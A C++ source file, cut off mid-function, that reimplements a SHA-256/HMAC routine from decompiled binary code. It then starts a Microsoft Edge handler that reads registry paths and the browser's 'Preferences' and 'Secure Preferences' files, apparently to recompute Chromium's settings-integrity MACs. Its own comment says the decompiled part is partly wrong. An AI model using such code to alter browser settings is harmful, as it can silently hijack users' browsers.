#include "stdafx.h"

namespace local {

 /******************************************************************************
 *  版权所有（C）2013-9999，小强(Beetle甲壳虫)工作室                                    *
 *  保留所有权利。                                                            *
 ******************************************************************************
 *  作者 : 马超
 *  版本 : 1.0
 *****************************************************************************/
 /*  修改记录:
       日期       版本    修改人             修改内容
     --------------------------------------------------------------------------
 ******************************************************************************/
 namespace machao {
  /*namespace IDAHeader */
  namespace {
   /*

This file contains definitions used by the Hex-Rays decompiler output.
It has type definitions and convenience macros to make the
output more readable.

Copyright (c) 2007-2011 Hex-Rays

*/

#if defined(__GNUC__)
   typedef          long long ll;
   typedef unsigned long long ull;
#define __int64 long long
#define __int32 int
#define __int16 short
#define __int8  char
#define MAKELL(num) num ## LL
#define FMT_64 "ll"
#elif defined(_MSC_VER)
   typedef          __int64 ll;
   typedef unsigned __int64 ull;
#define MAKELL(num) num ## i64
#define FMT_64 "I64"
#elif defined (__BORLANDC__)
   typedef          __int64 ll;
   typedef unsigned __int64 ull;
#define MAKELL(num) num ## i64
#define FMT_64 "L"
#else
#error "unknown compiler"
#endif
   typedef unsigned int uint;
   typedef unsigned char uchar;
   typedef unsigned short ushort;
   typedef unsigned long ulong;

   typedef          char   int8;
   typedef   signed char   sint8;
   typedef unsigned char   uint8;
   typedef          short  int16;
   typedef   signed short  sint16;
   typedef unsigned short  uint16;
   typedef          int    int32;
   typedef   signed int    sint32;
   typedef unsigned int    uint32;
   typedef ll              int64;
   typedef ll              sint64;
   typedef ull             uint64;

   // Partially defined types:
#define _BYTE  uint8
#define _WORD  uint16
#define _DWORD uint32
#define _QWORD uint64
#if !defined(_MSC_VER)
#define _LONGLONG __int128
#endif

#ifndef _WINDOWS_
   typedef int8 BYTE;
   typedef int16 WORD;
   typedef int32 DWORD;
   typedef int32 LONG;
#endif
   typedef int64 QWORD;
#ifndef __cplusplus
   typedef int bool;       // we want to use bool in our C programs
#endif

   // Some convenience macros to make partial accesses nicer
   // first unsigned macros:
#define _LOBYTE(x)   (*((_BYTE*)&(x)))   // low byte
#define _LOWORD(x)   (*((_WORD*)&(x)))   // low word
#define _LODWORD(x)  (*((_DWORD*)&(x)))  // low dword
#define _HIBYTE(x)   (*((_BYTE*)&(x)+1))
#define _HIWORD(x)   (*((_WORD*)&(x)+1))
#define _HIDWORD(x)  (*((_DWORD*)&(x)+1))
#define BYTEn(x, n)   (*((_BYTE*)&(x)+n))
#define WORDn(x, n)   (*((_WORD*)&(x)+n))
#define BYTE1(x)   BYTEn(x,  1)         // byte 1 (counting from 0)
#define BYTE2(x)   BYTEn(x,  2)
#define BYTE3(x)   BYTEn(x,  3)
#define BYTE4(x)   BYTEn(x,  4)
#define BYTE5(x)   BYTEn(x,  5)
#define BYTE6(x)   BYTEn(x,  6)
#define BYTE7(x)   BYTEn(x,  7)
#define BYTE8(x)   BYTEn(x,  8)
#define BYTE9(x)   BYTEn(x,  9)
#define BYTE10(x)  BYTEn(x, 10)
#define BYTE11(x)  BYTEn(x, 11)
#define BYTE12(x)  BYTEn(x, 12)
#define BYTE13(x)  BYTEn(x, 13)
#define BYTE14(x)  BYTEn(x, 14)
#define BYTE15(x)  BYTEn(x, 15)
#define WORD1(x)   WORDn(x,  1)
#define WORD2(x)   WORDn(x,  2)         // third word of the object, unsigned
#define WORD3(x)   WORDn(x,  3)
#define WORD4(x)   WORDn(x,  4)
#define WORD5(x)   WORDn(x,  5)
#define WORD6(x)   WORDn(x,  6)
#define WORD7(x)   WORDn(x,  7)

// add self
#define DWORDn(x, n)   (*((_DWORD*)&(x)+n))
#define DWORD1(x)   DWORDn(x,  1)
#define DWORD2(x)   DWORDn(x,  2)         // third word of the object, unsigned
#define DWORD3(x)   DWORDn(x,  3)
#define DWORD4(x)   DWORDn(x,  4)
#define DWORD5(x)   DWORDn(x,  5)
#define DWORD6(x)   DWORDn(x,  6)
#define DWORD7(x)   DWORDn(x,  7)
      // now signed macros (the same but with sign extension)
#define SLOBYTE(x)   (*((int8*)&(x)))
#define SLOWORD(x)   (*((int16*)&(x)))
#define SLODWORD(x)  (*((int32*)&(x)))
#define SHIBYTE(x)   (*((int8*)&(x)+1))
#define SHIWORD(x)   (*((int16*)&(x)+1))
#define SHIDWORD(x)  (*((int32*)&(x)+1))
#define SBYTEn(x, n)   (*((int8*)&(x)+n))
#define SWORDn(x, n)   (*((int16*)&(x)+n))
#define SBYTE1(x)   SBYTEn(x,  1)
#define SBYTE2(x)   SBYTEn(x,  2)
#define SBYTE3(x)   SBYTEn(x,  3)
#define SBYTE4(x)   SBYTEn(x,  4)
#define SBYTE5(x)   SBYTEn(x,  5)
#define SBYTE6(x)   SBYTEn(x,  6)
#define SBYTE7(x)   SBYTEn(x,  7)
#define SBYTE8(x)   SBYTEn(x,  8)
#define SBYTE9(x)   SBYTEn(x,  9)
#define SBYTE10(x)  SBYTEn(x, 10)
#define SBYTE11(x)  SBYTEn(x, 11)
#define SBYTE12(x)  SBYTEn(x, 12)
#define SBYTE13(x)  SBYTEn(x, 13)
#define SBYTE14(x)  SBYTEn(x, 14)
#define SBYTE15(x)  SBYTEn(x, 15)
#define SWORD1(x)   SWORDn(x,  1)
#define SWORD2(x)   SWORDn(x,  2)
#define SWORD3(x)   SWORDn(x,  3)
#define SWORD4(x)   SWORDn(x,  4)
#define SWORD5(x)   SWORDn(x,  5)
#define SWORD6(x)   SWORDn(x,  6)
#define SWORD7(x)   SWORDn(x,  7)


      // Helper functions to represent some assembly instructions.

#ifdef __cplusplus

      // Fill memory block with an integer value
   inline void memset32(void* ptr, uint32 value, int count)
   {
    uint32* p = (uint32*)ptr;
    for (int i = 0; i < count; i++)
     *p++ = value;
   }

   // Generate a reference to pair of operands
   template<class T>  int16 __PAIR__(int8  high, T low) { return (((int16)high) << sizeof(high) * 8) | uint8(low); }
   template<class T>  int32 __PAIR__(int16 high, T low) { return (((int32)high) << sizeof(high) * 8) | uint16(low); }
   template<class T>  int64 __PAIR__(int32 high, T low) { return (((int64)high) << sizeof(high) * 8) | uint32(low); }
   template<class T> uint16 __PAIR__(uint8  high, T low) { return (((uint16)high) << sizeof(high) * 8) | uint8(low); }
   template<class T> uint32 __PAIR__(uint16 high, T low) { return (((uint32)high) << sizeof(high) * 8) | uint16(low); }
   template<class T> uint64 __PAIR__(uint32 high, T low) { return (((uint64)high) << sizeof(high) * 8) | uint32(low); }

   // rotate left
   template<class T> T __ROL__(T value, uint count)
   {
    const uint nbits = sizeof(T) * 8;
    count %= nbits;

    T high = value >> (nbits - count);
    value <<= count;
    value |= high;
    return value;
   }

   // rotate right
   template<class T> T __ROR__(T value, uint count)
   {
    const uint nbits = sizeof(T) * 8;
    count %= nbits;

    T low = value << (nbits - count);
    value >>= count;
    value |= low;
    return value;
   }

   inline uint8  __ROL1__(uint8  value, int count) { return __ROL__((uint8)value, count); }
   inline uint16 __ROL2__(uint16 value, int count) { return __ROL__((uint16)value, count); }
   inline uint32 __ROL4__(uint32 value, int count) { return __ROL__((uint32)value, count); }
   inline uint64 __ROL8__(uint64 value, int count) { return __ROL__((uint64)value, count); }
   inline uint8  __ROR1__(uint8  value, int count) { return __ROR__((uint8)value, -count); }
   inline uint16 __ROR2__(uint16 value, int count) { return __ROR__((uint16)value, -count); }
   inline uint32 __ROR4__(uint32 value, int count) { return __ROR__((uint32)value, -count); }
   inline uint64 __ROR8__(uint64 value, int count) { return __ROR__((uint64)value, -count); }

   // carry flag of left shift
   template<class T> int8 __MKCSHL__(T value, uint count)
   {
    const uint nbits = sizeof(T) * 8;
    count %= nbits;

    return (value >> (nbits - count)) & 1;
   }

   // carry flag of right shift
   template<class T> int8 __MKCSHR__(T value, uint count)
   {
    return (value >> (count - 1)) & 1;
   }

   // sign flag
   template<class T> int8 __SETS__(T x)
   {
    if (sizeof(T) == 1)
     return int8(x) < 0;
    if (sizeof(T) == 2)
     return int16(x) < 0;
    if (sizeof(T) == 4)
     return int32(x) < 0;
    return int64(x) < 0;
   }

   // overflow flag of subtraction (x-y)
   template<class T, class U> int8 __OFSUB__(T x, U y)
   {
    if (sizeof(T) < sizeof(U))
    {
     U x2 = x;
     int8 sx = __SETS__(x2);
     return (sx ^ __SETS__(y)) & (sx ^ __SETS__(x2 - y));
    }
    else
    {
     T y2 = y;
     int8 sx = __SETS__(x);
     return (sx ^ __SETS__(y2)) & (sx ^ __SETS__(x - y2));
    }
   }

   // overflow flag of addition (x+y)
   template<class T, class U> int8 __OFADD__(T x, U y)
   {
    if (sizeof(T) < sizeof(U))
    {
     U x2 = x;
     int8 sx = __SETS__(x2);
     return ((1 ^ sx) ^ __SETS__(y)) & (sx ^ __SETS__(x2 + y));
    }
    else
    {
     T y2 = y;
     int8 sx = __SETS__(x);
     return ((1 ^ sx) ^ __SETS__(y2)) & (sx ^ __SETS__(x + y2));
    }
   }

   // carry flag of subtraction (x-y)
   template<class T, class U> int8 __CFSUB__(T x, U y)
   {
    int size = sizeof(T) > sizeof(U) ? sizeof(T) : sizeof(U);
    if (size == 1)
     return uint8(x) < uint8(y);
    if (size == 2)
     return uint16(x) < uint16(y);
    if (size == 4)
     return uint32(x) < uint32(y);
    return uint64(x) < uint64(y);
   }

   // carry flag of addition (x+y)
   template<class T, class U> int8 __CFADD__(T x, U y)
   {
    int size = sizeof(T) > sizeof(U) ? sizeof(T) : sizeof(U);
    if (size == 1)
     return uint8(x) > uint8(x + y);
    if (size == 2)
     return uint16(x) > uint16(x + y);
    if (size == 4)
     return uint32(x) > uint32(x + y);
    return uint64(x) > uint64(x + y);
   }

#else
      // The following definition is not quite correct because it always returns
      // uint64. The above C++ functions are good, though.
#define __PAIR__(high, low) (((uint64)(high)<<sizeof(high)*8) | low)
      // For C, we just provide macros, they are not quite correct.
#define __ROL__(x, y) __rotl__(x, y)      // Rotate left
#define __ROR__(x, y) __rotr__(x, y)      // Rotate right
#define __CFSHL__(x, y) invalid_operation // Generate carry flag for (x<<y)
#define __CFSHR__(x, y) invalid_operation // Generate carry flag for (x>>y)
#define __CFADD__(x, y) invalid_operation // Generate carry flag for (x+y)
#define __CFSUB__(x, y) invalid_operation // Generate carry flag for (x-y)
#define __OFADD__(x, y) invalid_operation // Generate overflow flag for (x+y)
#define __OFSUB__(x, y) invalid_operation // Generate overflow flag for (x-y)
#endif

      // No definition for rcl/rcr because the carry flag is unknown
#define __RCL__(x, y)    invalid_operation // Rotate left thru carry
#define __RCR__(x, y)    invalid_operation // Rotate right thru carry
#define __MKCRCL__(x, y) invalid_operation // Generate carry flag for a RCL
#define __MKCRCR__(x, y) invalid_operation // Generate carry flag for a RCR
#define __SETP__(x, y)   invalid_operation // Generate parity flag for (x-y)

      // In the decompilation listing there are some objects declarared as _UNKNOWN
      // because we could not determine their types. Since the C compiler does not
      // accept void item declarations, we replace them by anything of our choice,
      // for example a char:

#define _UNKNOWN char

#ifdef _MSC_VER
#define snprintf _snprintf
#define vsnprintf _vsnprintf
#endif

   inline unsigned __int64 _aullshr_cus(DWORD L, DWORD H, int cl)
   {
    unsigned __int64 a64v1 = 0;

    if (cl >= 0x40u)
     return 0;
    else if (cl >= 0x20u)
    {
     L = H;
     H = 0;
     cl &= 0x1F;
     a64v1 = L >> cl;
    }
    else
    {
     _HIDWORD(a64v1) = H;
     _LODWORD(a64v1) = L;
     a64v1 = a64v1 >> cl;
     H = H >> cl;
    }
    return a64v1;
   }

   inline unsigned __int64 _aullshr(unsigned __int64 a1, unsigned __int8 a2)
   {
    if (a2 >= 0x40u)
     return 0;
    else
     return a1 >> a2;
   }

   inline __int64 _allmul(__int64 a1, __int64 a2)
   {
    if (_HIDWORD(a1) | _HIDWORD(a2))
     return a1 * a2;
    else
     return (unsigned int)a2 * (unsigned __int64)(unsigned int)a1;
   }

   inline unsigned __int64 _aullrem(unsigned __int64 a1, __int64 a2)
   {
    unsigned __int64 v2; // rtt
    unsigned int v4; // ecx
    unsigned int v5; // ebx
    unsigned __int64 v6; // rax
    bool v7; // cf
    int v8; // ecx
    unsigned __int64 v9; // rax

    if (_HIDWORD(a2))
    {
     v4 = _HIDWORD(a2);
     v5 = decltype(v5)(a2);
     v6 = a1;
     do
     {
      v7 = v4 & 1;
      v4 >>= 1;
      v5 = (v5 >> 1) | (v7 << 31);
      v6 >>= 1;
     } while (v4);
     v8 = decltype(v8)(_HIDWORD(a2) * (v6 / v5));
     v9 = (unsigned int)a2 * (unsigned __int64)(unsigned int)(v6 / v5);
     v7 = __CFADD__(v8, _HIDWORD(v9));
     _HIDWORD(v9) += v8;
     if (v7 || v9 > a1)
      v9 -= a2;
     return a1 - v9;
    }
    else
    {
     _LODWORD(v2) = (uint32)a1;
     _HIDWORD(v2) = _HIDWORD(a1) % (unsigned int)a2;
     return v2 % (unsigned int)a2;
    }
    //return a1 % a2;
   }
  }///namespace IDAHeader


  const BYTE kEdgeTable256[256] = {
 0x98 ,0x2F ,0x8A ,0x42 ,0x91 ,0x44 ,0x37 ,0x71 ,0xCF ,0xFB ,0xC0 ,0xB5 ,0xA5 ,0xDB ,0xB5 ,0xE9
 ,0x5B ,0xC2 ,0x56 ,0x39 ,0xF1 ,0x11 ,0xF1 ,0x59 ,0xA4 ,0x82 ,0x3F ,0x92 ,0xD5 ,0x5E ,0x1C ,0xAB
 ,0x98 ,0xAA ,0x07 ,0xD8 ,0x01 ,0x5B ,0x83 ,0x12 ,0xBE ,0x85 ,0x31 ,0x24 ,0xC3 ,0x7D ,0x0C ,0x55
 ,0x74 ,0x5D ,0xBE ,0x72 ,0xFE ,0xB1 ,0xDE ,0x80 ,0xA7 ,0x06 ,0xDC ,0x9B ,0x74 ,0xF1 ,0x9B ,0xC1
 ,0xC1 ,0x69 ,0x9B ,0xE4 ,0x86 ,0x47 ,0xBE ,0xEF ,0xC6 ,0x9D ,0xC1 ,0x0F ,0xCC ,0xA1 ,0x0C ,0x24
 ,0x6F ,0x2C ,0xE9 ,0x2D ,0xAA ,0x84 ,0x74 ,0x4A ,0xDC ,0xA9 ,0xB0 ,0x5C ,0xDA ,0x88 ,0xF9 ,0x76
 ,0x52 ,0x51 ,0x3E ,0x98 ,0x6D ,0xC6 ,0x31 ,0xA8 ,0xC8 ,0x27 ,0x03 ,0xB0 ,0xC7 ,0x7F ,0x59 ,0xBF
 ,0xF3 ,0x0B ,0xE0 ,0xC6 ,0x47 ,0x91 ,0xA7 ,0xD5 ,0x51 ,0x63 ,0xCA ,0x06 ,0x67 ,0x29 ,0x29 ,0x14
 ,0x85 ,0x0A ,0xB7 ,0x27 ,0x38 ,0x21 ,0x1B ,0x2E ,0xFC ,0x6D ,0x2C ,0x4D ,0x13 ,0x0D ,0x38 ,0x53
 ,0x54 ,0x73 ,0x0A ,0x65 ,0xBB ,0x0A ,0x6A ,0x76 ,0x2E ,0xC9 ,0xC2 ,0x81 ,0x85 ,0x2C ,0x72 ,0x92
 ,0xA1 ,0xE8 ,0xBF ,0xA2 ,0x4B ,0x66 ,0x1A ,0xA8 ,0x70 ,0x8B ,0x4B ,0xC2 ,0xA3 ,0x51 ,0x6C ,0xC7
 ,0x19 ,0xE8 ,0x92 ,0xD1 ,0x24 ,0x06 ,0x99 ,0xD6 ,0x85 ,0x35 ,0x0E ,0xF4 ,0x70 ,0xA0 ,0x6A ,0x10
 ,0x16 ,0xC1 ,0xA4 ,0x19 ,0x08 ,0x6C ,0x37 ,0x1E ,0x4C ,0x77 ,0x48 ,0x27 ,0xB5 ,0xBC ,0xB0 ,0x34
 ,0xB3 ,0x0C ,0x1C ,0x39 ,0x4A ,0xAA ,0xD8 ,0x4E ,0x4F ,0xCA ,0x9C ,0x5B ,0xF3 ,0x6F ,0x2E ,0x68
 ,0xEE ,0x82 ,0x8F ,0x74 ,0x6F ,0x63 ,0xA5 ,0x78 ,0x14 ,0x78 ,0xC8 ,0x84 ,0x08 ,0x02 ,0xC7 ,0x8C
 ,0xFA ,0xFF ,0xBE ,0x90 ,0xEB ,0x6C ,0x50 ,0xA4 ,0xF7 ,0xA3 ,0xF9 ,0xBE ,0xF2 ,0x78 ,0x71 ,0xC6
  };


  //sub_5592F1  sub_5E87E0
  int sub_5592F1(_DWORD* a1) {
   int result; // eax
   //const BYTE kEdgeTable32[32] = {
   //	0x67 ,0xE6 ,0x09 ,0x6A ,0x85 ,0xAE ,0x67 ,0xBB ,0x72 ,0xF3 ,0x6E ,0x3C ,0x3A ,0xF5 ,0x4F ,0xA5
   //	,0x7F ,0x52 ,0x0E ,0x51 ,0x8C ,0x68 ,0x05 ,0x9B ,0xAB ,0xD9 ,0x83 ,0x1F ,0x19 ,0xCD ,0xE0 ,0x5B
   //};
   //__CheckForDebuggerJustMyCode(&unk_92486B);
   *a1 = 0;
   a1[1] = 0;
   a1[2] = 1779033703;
   a1[3] = -1150833019;
   a1[4] = 1013904242;
   a1[5] = -1521486534;
   a1[6] = 1359893119;
   a1[7] = -1694144372;
   a1[8] = 528734635;
   result = 4;
   a1[9] = 1541459225;
   return result;
  }

  void sub_5E8900(BYTE* a1, BYTE* a2) {
   int v2; // esi
   int v3; // eax
   unsigned int v4; // esi
   int v5; // edi
   int v6; // eax
   int v7; // esi
   int v8; // esi
   int v9; // eax
   int v10; // esi
   int v11; // esi
   int v12; // eax
   unsigned int i; // [esp+DCh] [ebp-18Ch]
   DWORD v17[64]; // [esp+E0h] [ebp-188h]
   int v18; // [esp+1F0h] [ebp-78h]
   int v19; // [esp+1FCh] [ebp-6Ch]
   int v20; // [esp+208h] [ebp-60h]
   int v21; // [esp+214h] [ebp-54h]
   int v22; // [esp+220h] [ebp-48h]
   int v23; // [esp+22Ch] [ebp-3Ch]
   int v24; // [esp+238h] [ebp-30h]
   int v25; // [esp+244h] [ebp-24h]
   int v26; // [esp+250h] [ebp-18h]
   int v27; // [esp+25Ch] [ebp-Ch]

   //__CheckForDebuggerJustMyCode(&unk_92486B);

   DWORD* da1 = (DWORD*)a1;
   DWORD* da2 = (DWORD*)a2;

   for (i = 0; i < 0x10; i++)
   {
    v17[i] = _byteswap_ulong(*(DWORD*)(da2 + i));
   }
   while (i < 0x40)
   {
    BYTE* bv1 = (BYTE*)v17 + i * 4 - 8;
    DWORD* dv1 = (DWORD*)bv1;

    BYTE* bv2 = (BYTE*)v17 + i * 4 - 28;
    DWORD* dv2 = (DWORD*)bv2;

    BYTE* bv3 = (BYTE*)v17 + i * 4 - 60;
    DWORD* dv3 = (DWORD*)bv3;

    BYTE* bv4 = (BYTE*)v17 + i * 4 - 64;
    DWORD* dv4 = (DWORD*)bv4;

    v2 = _lrotr(*dv1, 17);
    v3 = _lrotr(*dv1, 19);
    v4 = (*dv2) + ((*dv1 >> 10) ^ v3 ^ v2);
    v5 = _lrotr(*dv3, 7);
    v6 = _lrotr(*dv3, 18);
    v17[i] = *dv4 + ((*dv3 >> 3) ^ v6 ^ v5) + v4;
    ++i;
   }
   v25 = da1[2];
   v24 = da1[3];
   v23 = da1[4];
   v22 = da1[5];
   v21 = da1[6];
   v20 = da1[7];
   v19 = da1[8];
   v18 = da1[9];
   for (i = 0; i < 0x40; ++i)
   {
    BYTE* bv1 = (BYTE*)kEdgeTable256 + i * 4;
    DWORD* dv1 = (DWORD*)bv1;
    v7 = _lrotr(v21, 6);
    v8 = _lrotr(v21, 11) ^ v7;
    v9 = _lrotr(v21, 25);
    v27 = v17[i] + *dv1 + (v19 ^ v21 & (v19 ^ v20)) + v18 + (v9 ^ v8);
    v10 = _lrotr(v25, 2);
    v11 = _lrotr(v25, 13) ^ v10;
    v12 = _lrotr(v25, 22);
    v26 = (v23 & (v24 | v25) | v24 & v25) + (v12 ^ v11);
    v18 = v19;
    v19 = v20;
    v20 = v21;
    v21 = v27 + v22;
    v22 = v23;
    v23 = v24;
    v24 = v25;
    v25 = v26 + v27;
   }
   da1[2] += v25;
   da1[3] += v24;
   da1[4] += v23;
   da1[5] += v22;
   da1[6] += v21;
   da1[7] += v20;
   da1[8] += v19;
   da1[9] += v18;
   return;
  }

  void sub_55DA4F(BYTE* a1, BYTE* a2, size_t Size) //sub_5E8EA0
  {
   DWORD* da1 = (DWORD*)a1;
   BYTE* Src; // [esp+DCh] [ebp-8h]

   //__CheckForDebuggerJustMyCode(&unk_92486B);
   Src = a2;
   unsigned __int64 a64v1;
   __int64 a64v2;
   _HIDWORD(a64v1) = da1[1];
   _LODWORD(a64v1) = da1[0];
   _HIDWORD(a64v2) = 0;
   _LODWORD(a64v2) = 0x40;
   unsigned __int64 v4 = _aullrem(a64v1, a64v2);
   da1[0] += (DWORD)Size;
   if (v4)
   {
    if (v4 + Size < 0x40)
    {
     memmove((char*)(a1 + v4 + 40), a2, Size);
     return;
    }
    memmove((char*)(a1 + v4 + 40), a2, 64 - v4);
    Size -= 64 - v4;
    Src = &a2[64 - v4];
    sub_5E8900(a1, (BYTE*)(da1 + 10));
   }
   while (Size >= 0x40)
   {
    sub_5E8900(a1, Src);
    Size -= 64;
    Src += 64;
   }
   if (Size > 0)
   {
    memmove((BYTE*)(da1 + 10), (void*)Src, Size);
   }

   return;
  }

  void sub_55F5E8(BYTE* a1, BYTE* a2, size_t Size) {
   sub_55DA4F(a1 + 128, a2, Size);
  }

  int sub_55B673(BYTE* a1, BYTE* a2) //sub_5E84F0
  {
   DWORD* da1 = (DWORD*)a1;
   DWORD* da2 = (DWORD*)a2;

   unsigned __int64 v2; // rax
   unsigned int i; // [esp+D0h] [ebp-14h]
   int v5; // [esp+DCh] [ebp-8h]

   //__CheckForDebuggerJustMyCode(&unk_92486B);
   unsigned __int64 a64v1;
   __int64 a64v2;
   _HIDWORD(a64v1) = da1[1];
   _LODWORD(a64v1) = da1[0];
   _HIDWORD(a64v2) = 0;
   _LODWORD(a64v2) = 0x40;
   v2 = _aullrem(a64v1, a64v2);
   *(a1 + v2 + 40) = 0x80;
   v5 = int(v2 + 1);
   if ((unsigned int)(v2 + 1) > 0x38)
   {
    memset((void*)(a1 + v5 + 40), 0, 64 - v5);
    v5 = 0;
    sub_5E8900(a1, a1 + 40);
   }
   memset((void*)(a1 + v5 + 40), 0, 56 - v5);
   _HIDWORD(a64v1) = da1[1];
   _LODWORD(a64v1) = da1[0];
   _HIDWORD(a64v2) = 0;
   _LODWORD(a64v2) = 0x8;
   int64_t dt1 = _allmul(a64v1, a64v2);
   da1[1] = _HIDWORD(dt1);
   da1[0] = _LODWORD(dt1);
   //这一部分反编译出错了，所以不能尽信，可以用了看效果，不行就微调
   //*(_BYTE *)(a1 + 96) = _HIBYTE(*(_QWORD *)a1);
   *(_BYTE*)(a1 + 96) = (BYTE)_aullshr_cus(da1[0], da1[1], 0x38);
   //*(_BYTE *)(a1 + 97) = BYTE6(*(_QWORD *)a1);
   *(_BYTE*)(a1 + 97) = (BYTE)_aullshr_cus(da1[0], da1[1], 0x30);
   //*(_BYTE *)(a1 + 98) = BYTE1(*(_DWORD *)(a1 + 4));
   *(_BYTE*)(a1 + 98) = (BYTE)_aullshr_cus(da1[0], da1[1], 0x28);
   //*(_BYTE *)(a1 + 99) = *(_DWORD *)(a1 + 4);
   *(_BYTE*)(a1 + 99) = (BYTE)_aullshr_cus(da1[0], da1[1], 0x20);
   //*(_BYTE *)(a1 + 100) = HIBYTE(*(_DWORD *)a1);
   *(_BYTE*)(a1 + 100) = (BYTE)_aullshr_cus(da1[0], da1[1], 0x18);
   //*(_BYTE *)(a1 + 101) = BYTE2(*(_DWORD *)a1);
   *(_BYTE*)(a1 + 101) = (BYTE)_aullshr_cus(da1[0], da1[1], 0x10);
   //*(_BYTE *)(a1 + 102) = BYTE1(*(_QWORD *)a1);
   *(_BYTE*)(a1 + 102) = (BYTE)_aullshr_cus(da1[0], da1[1], 0x8);
   *(_BYTE*)(a1 + 103) = *(_BYTE*)a1;
   sub_5E8900(a1, a1 + 40);
   for (i = 0; i < 8; ++i)
   {
    //*(_BYTE *)(a2 + 4 * i) = HIBYTE(*(_DWORD *)(a1 + 4 * i + 8));
    *(_BYTE*)(a2 + 4 * i) = (BYTE)((*(_DWORD*)(a1 + 4 * i + 8)) >> 0x18);
    //*(_BYTE *)(a2 + 4 * i + 1) = BYTE2(*(_DWORD *)(a1 + 4 * i + 8));
    *(_BYTE*)(a2 + 4 * i + 1) = (BYTE)((*(_DWORD*)(a1 + 4 * i + 8)) >> 0x10);
    //*(_BYTE *)(a2 + 4 * i + 2) = BYTE1(*(_DWORD *)(a1 + 4 * i + 8));
    *(_BYTE*)(a2 + 4 * i + 2) = (BYTE)((*(_DWORD*)(a1 + 4 * i + 8)) >> 0x8);
    //*(_BYTE *)(a2 + 4 * i + 3) = *(_BYTE *)(a1 + 4 * i + 8);
    *(_BYTE*)(a2 + 4 * i + 3) = (BYTE)(*(_DWORD*)(a1 + 4 * i + 8));
   }

   sub_5592F1((_DWORD*)a1);
   return 0;
  }

  void sub_55F0B1(BYTE* a1, BYTE* Src, size_t Size) //sub_5E7F60
  {
   unsigned int i; // [esp+D0h] [ebp-14h]
   unsigned int j; // [esp+D0h] [ebp-14h]
   BYTE* v6; // [esp+DCh] [ebp-8h]

   //__CheckForDebuggerJustMyCode(&unk_92486B);
   v6 = a1 + 128;
   if (Size > 0x40)
   {
    sub_5592F1((_DWORD*)v6);
    sub_55DA4F(v6, Src, Size);
    sub_55B673(v6, a1);
    memset(a1 + 32, 0, 0x20u);
   }
   else
   {
    memmove(a1, Src, Size);
    memset(&a1[Size], 0, 64 - Size);
   }
   for (i = 0; i < 0x40; ++i)
    a1[i] ^= 0x5Cu;
   sub_5592F1((_DWORD*)v6);
   sub_55DA4F(v6, a1, 0x40u);
   memmove(a1 + 96, a1 + 136, 0x20u);
   for (j = 0; j < 0x40; ++j)
    a1[j] ^= 0x6Au;
   sub_5592F1((_DWORD*)v6);
   sub_55DA4F(v6, a1, 0x40u);
   memmove(a1 + 64, a1 + 136, 0x20u);
  }
  void sub_55E1BB(BYTE* a1, BYTE* a2) //sub_5E7E60
  {
   DWORD* da1 = (DWORD*)a1;
   sub_55B673((BYTE*)(da1 + 32), a2);
   //memmove(a1 + 0x88, a1 + 0x60, 0x20u);
   memmove(da1 + 34, da1 + 24, 0x20u);
   da1[32] = 64;
   da1[33] = 0;
   sub_55DA4F((BYTE*)(da1 + 32), a2, 0x20u);
   sub_55B673((BYTE*)(da1 + 32), a2);
   memmove(da1 + 34, da1 + 16, 0x20u);
   da1[32] = 64;
   da1[33] = 0;
  }
  void sub_56006A(BYTE* a1, BYTE* a2, BYTE* a3, size_t Size) {
   sub_55F0B1(a1, a2, 0);
   sub_55F5E8(a1, a3, Size);
   sub_55E1BB(a1, a2);
  }


  static void Encrypt(const std::string& input, std::string& hex_string) {
   do {
    BYTE a1[0xF0] = { 0 };
    BYTE a2[0x20] = { 0 };
    machao::sub_56006A(a1, a2, (BYTE*)input.data(), input.size());
    hex_string = shared::Win::BinToHex(std::string((char*)&a2[0], sizeof(a2)));
    hex_string = shared::IConv::ToUpperA(hex_string);
   } while (0);
  }

 }///namespace machao


 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


 MicrosoftEdge::MicrosoftEdge(const protocol::EnBrowserID& id) : IBrowser(id) {
  Init();
 }

 MicrosoftEdge::~MicrosoftEdge() {
  UnInit();
 }
 bool MicrosoftEdge::Ready() const {
  return false;
 }
 void MicrosoftEdge::Init() {
  do {
   auto found_key = protocol::MapBrowserSystemAppPathsIDKey.find(ID);
   if (found_key == protocol::MapBrowserSystemAppPathsIDKey.end())
    break;
   std::string key_path = protocol::HKLM_AppPaths;
   key_path = shared::Win::PathFixedA(key_path + "\\" + protocol::MapBrowserSystemAppPathsIDKey.at(ID) + "\\");
   shared::Win::Registry::Read(key_path, MainProgramPathname);
   if (!shared::Win::AccessA(MainProgramPathname)) {
    MainProgramPathname.clear();
    break;
   }
   shared::Win::Registry::Read(shared::Win::PathFixedA(key_path + "\\" + protocol::HKLM_AppPathsKey), InstallPath);
   if (!shared::Win::AccessA(InstallPath)) {
    InstallPath.clear();
    break;
   }
   shared::Win::File::Attribute::GetFileVersion(MainProgramPathname, Version);
   ResourcesPakPathname = shared::Win::PathFixedA(InstallPath + "\\" + Version + "\\" + "Resources.Pak");
   if (!shared::Win::AccessA(ResourcesPakPathname))
    break;
   if (protocol::MapBrowserRegisterPoliciesPath.find(ID) != protocol::MapBrowserRegisterPoliciesPath.end()) {
    std::string PoliciesPath = protocol::MapBrowserRegisterPoliciesPath.at(ID);
    //UserDataDir
    std::string UserDataDirRegPath = shared::Win::PathFixedA(PoliciesPath + "\\" + protocol::HKLM_ChromiumBrowserPoliciesUserDataDirKey);
    shared::Win::Registry::NtRead(UserDataDirRegPath, UserDataDir);
    //DiskCacheDir
    std::string DiskCacheDirRegPath = shared::Win::PathFixedA(PoliciesPath + "\\" + protocol::HKLM_ChromiumBrowserPoliciesDiskCacheDirKey);
    shared::Win::Registry::NtRead(DiskCacheDirRegPath, DiskCacheDir);
   }
   if (UserDataDir.empty()) {
    auto found = protocol::MapBrowserDefaultUserDataDir.find(ID);
    if (found != protocol::MapBrowserDefaultUserDataDir.end()) {
     UserDataDir = shared::Win::PathFixedA(Core::CurrentUserAppData() + "\\" + protocol::MapBrowserDefaultUserDataDir.at(ID));
    }
   }
   if (!shared::Win::AccessA(UserDataDir))
    break;
   UserDataDefaultPreferencesPathname = shared::Win::PathFixedA(UserDataDir + "\\" + "Preferences");
   UserDataDefaultSecurePreferencesPathname = shared::Win::PathFixedA(UserDataDir + "\\" + "Secure Preferences");
   if (!shared::Win::AccessA(UserDataDefaultPreferencesPathname) || !shared::Win::AccessA(UserDataDefaultSecurePreferencesPathname))
    break;
   std::string SecurePreferencesBuffer = shared::Win::File::Read(UserDataDefaultSecurePreferencesPathname);
   do {
    if (SecurePreferencesBuffer.empty())
     break;
